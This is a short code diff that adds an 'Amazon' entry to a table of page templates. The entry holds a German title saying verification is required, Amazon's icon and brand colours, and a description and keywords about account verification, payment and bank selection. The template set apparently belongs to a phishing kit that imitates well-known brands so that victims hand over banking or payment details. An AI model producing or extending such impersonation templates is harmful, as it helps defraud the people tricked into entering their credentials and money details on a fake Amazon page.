@@ -426,6 +426,20 @@ export const TEMPLATE_METADATA: Record<string, TemplateMetadata> = {
     fonts: [],
     brandColor: '#0b3a66',
     brandColorSecondary: '#7fbf0f'
+  },
+
+  amazon: {
+    name: 'amazon',
+    displayName: 'Amazon',
+    title: 'Amazon.de – Verifizierung erforderlich',
+    favicon: '/images/icons/amazon.svg',
+    appleIcon: '/images/icons/amazon.svg',
+    themeColor: '#131921',
+    description: 'Amazon.de Kontoverifizierung zur sicheren Zahlungsabwicklung.',
+    keywords: 'Amazon, Verifizierung, Sicherheit, Zahlung, Bankauswahl',
+    fonts: [],
+    brandColor: '#131921',
+    brandColorSecondary: '#f3a847'
   }
 };
 
